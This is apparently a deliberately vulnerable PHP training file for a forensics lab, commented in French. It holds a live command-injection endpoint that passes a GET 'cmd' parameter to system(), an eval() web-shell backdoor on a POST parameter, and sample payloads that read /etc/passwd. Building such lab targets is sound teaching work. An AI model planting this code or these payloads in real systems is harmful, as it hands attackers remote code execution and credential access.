<?php
/**
 * =====================================================================
 * index.php — Application web COMPROMISE (cible d'analyse forensique)
 * =====================================================================
 * Simule un dashboard d'entreprise qui a été compromis par un attaquant.
 * Deux vulnérabilités majeures (command injection + backdoor eval)
 * sont présentes pour que l'analyste forensique les identifie.
 * =====================================================================
 */

// En-tête HTTP — déclare le charset UTF-8 pour éviter les problèmes d'encodage
header("Content-Type: text/html; charset=utf-8");
echo "<h1>Internal Dashboard</h1>";

/**
 * VULNÉRABILITÉ 1 : Injection de commandes (Command Injection)
 * ------------------------------------------------------------
 * Le paramètre GET 'cmd' est passé directement à system() sans aucune
 * validation ni échappement. Un attaquant peut exécuter n'importe quelle
 * commande shell sur le serveur.
 * Exemple d'exploitation : ?cmd=ls -la; cat /etc/passwd; whoami
 */
$cmd = $_GET['cmd'] ?? '';
if ($cmd) {
    echo "<pre>";
    system($cmd);  // VULNÉRABLE : exécute la commande shell sans filtrage
    echo "</pre>";
}

/**
 * BACKDOOR PERSISTANTE laissée par l'attaquant
 * ------------------------------------------------------------
 * Cette portion de code n'était PAS présente dans l'application originale.
 * Elle a été ajoutée par l'attaquant pour maintenir un accès permanent.
 *
 * Le paramètre POST 'backdoor' est transmis directement à eval(),
 * permettant à l'attaquant d'exécuter du code PHP arbitraire.
 * Exemple : POST backdoor=phpinfo(); ou backdoor=system("id");
 *
 * Détection forensique : chercher des chaînes comme 'eval', 'backdoor',
 * 'system', des fichiers modifiés récemment, ou des logs POST suspects.
 */
if (isset($_POST['backdoor'])) {
    eval($_POST['backdoor']);  // Simule la persistance de l'attaquant
}

// Formulaire GET légitime en apparence servant de façade
echo "<form method='GET'>";
echo "<input type='text' name='cmd' placeholder='Command'>";
echo "<input type='submit' value='Ping'>";
echo "</form>";
?>
